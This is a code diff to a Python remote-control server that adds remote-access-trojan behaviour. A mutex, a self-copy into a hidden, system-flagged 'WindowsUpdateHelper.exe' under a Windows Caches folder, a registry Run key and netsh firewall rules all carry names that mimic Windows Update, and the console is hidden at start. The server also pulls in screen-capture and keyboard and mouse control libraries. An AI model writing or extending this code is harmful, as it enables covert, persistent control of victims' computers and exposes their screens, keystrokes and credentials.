@@ -6,6 +6,7 @@ import sys
 import os
 import subprocess
 import importlib
+import ctypes
 
 for _imp, _pip in [('numpy', 'numpy'), ('cv2', 'opencv-python-headless'), ('pyautogui', 'pyautogui'),
                     ('keyboard', 'keyboard'), ('pynput', 'pynput'), ('psutil', 'psutil'), ('mss', 'mss')]:
@@ -13,8 +14,11 @@ for _imp, _pip in [('numpy', 'numpy'), ('cv2', 'opencv-python-headless'), ('pyau
         importlib.import_module(_imp)
     except ImportError:
         print(f"Installing {_pip}...")
-        subprocess.check_call([sys.executable or 'python', '-m', 'pip', 'install', _pip],
-                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        try:
+            subprocess.check_call([sys.executable or 'python', '-m', 'pip', 'install', _pip],
+                                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        except:
+            print(f"Failed to install {_pip}")
 
 import numpy as np
 import cv2
@@ -44,6 +48,9 @@ def get_subnet_broadcast(ip, mask='255.255.255.0'):
 
 class RemoteControlServer:
     def __init__(self, host='0.0.0.0', port=65432):
+        mutex = ctypes.windll.kernel32.CreateMutexW(None, False, 'Global\\WindowsUpdateSvc')
+        if ctypes.windll.kernel32.GetLastError() == 183:
+            sys.exit(0)
         self.host = host
         self.port = port
         self.server_socket = None
@@ -81,10 +88,23 @@ class RemoteControlServer:
         except:
             pass
 
-    def add_to_startup(self):
+    def _get_installed_path(self):
+        dest_dir = os.path.join(os.environ.get('LOCALAPPDATA',
+                                os.path.join(os.environ.get('USERPROFILE', 'C:\\Users\\Default'),
+                                             'AppData', 'Local')),
+                                'Microsoft', 'Windows', 'Caches')
+        dest = os.path.join(dest_dir, 'WindowsUpdateHelper.exe')
+        if os.path.exists(dest):
+            return dest
+        return None
+
+    def add_to_startup(self, exe=None):
         try:
             import winreg
-            exe = os.environ.get('ORIG_EXE_PATH') or os.path.abspath(sys.argv[0])
+            if exe is None:
+                exe = self._get_installed_path()
+            if exe is None:
+                exe = os.environ.get('ORIG_EXE_PATH') or os.path.abspath(sys.argv[0])
             if not exe.lower().endswith('.exe'):
                 return
             key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
@@ -94,9 +114,49 @@ class RemoteControlServer:
         except:
             pass
 
+    def self_install(self):
+        src = os.environ.get('ORIG_EXE_PATH')
+        if not src or not src.lower().endswith('.exe'):
+            return
+        if 'MICROSOFT\\WINDOWS\\CACHES' in src.upper():
+            return
+        try:
+            import shutil, ctypes
+            dest_dir = os.path.join(os.environ.get('LOCALAPPDATA',
+                                    os.path.join(os.environ.get('USERPROFILE', 'C:\\Users\\Default'),
+                                                 'AppData', 'Local')),
+                                    'Microsoft', 'Windows', 'Caches')
+            os.makedirs(dest_dir, exist_ok=True)
+            dest = os.path.join(dest_dir, 'WindowsUpdateHelper.exe')
+            if os.path.abspath(src).lower() == os.path.abspath(dest).lower():
+                return
+            shutil.copy2(src, dest)
+            kernel32 = ctypes.windll.kernel32
+            kernel32.SetFileAttributesW(dest, 2 | 4)
+            self.add_to_startup(dest)
+        except:
+            pass
+
+    def add_firewall_rules(self):
+        try:
+            subprocess.run(['netsh', 'advfirewall', 'firewall', 'add', 'rule',
+                'name=WindowsUpdateSvc', 'dir=in', 'action=allow',
+                'protocol=TCP', f'localport={self.port}',
+                'profile=any', 'enable=yes'],
+                capture_output=True, shell=True)
+            subprocess.run(['netsh', 'advfirewall', 'firewall', 'add', 'rule',
+                'name=WindowsUdpDiscovery', 'dir=in', 'action=allow',
+                'protocol=UDP', 'localport=45631',
+                'profile=any', 'enable=yes'],
+                capture_output=True, shell=True)
+        except:
+            pass
+
     def start(self):
         self.hide_console()
+        self.self_install()
         self.add_to_startup()
+        self.add_firewall_rules()
         self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         self.server_socket.bind((self.host, self.port))
